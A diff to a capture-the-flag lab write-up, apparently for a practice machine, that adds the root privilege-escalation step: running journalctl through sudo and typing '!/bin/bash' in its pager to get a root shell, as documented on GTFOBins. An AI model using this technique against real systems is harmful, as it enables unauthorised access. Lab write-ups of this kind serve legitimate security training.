@@ -109,7 +109,7 @@ ssh -i id_rsa david@10.10.10.165
   <img src="screenshots/13.png" width="738">
 </p>
 
-And, finally the User FLag is retrieved.
+And, finally the user fLag is retrieved.
 
 <p align="center">
   <img src="screenshots/14.png" width="738">
@@ -163,4 +163,28 @@ chmod +x linenum.sh
   <img src="screenshots/18.png" width="738">
 </p>
 
+GTFOBins <a href="https://gtfobins.github.io/gtfobins/journalctl/">blog</a> contains a good way to abuse ```journalctl``` for escalating privileges.
 
+* Use the following command to start the ```server-stats``` service:
+
+```
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+```
+
+<p align="center">
+  <img src="screenshots/19.png" width="738">
+</p>
+
+* Type ```!/bin/bash``` to spawn an interactive system shell.
+
+<p align="center">
+  <img src="screenshots/20.png" width="738">
+</p>
+
+And, we are root!
+
+Finally, the root flag is retrieved.
+
+<p align="center">
+  <img src="screenshots/21.png" width="738">
+</p>
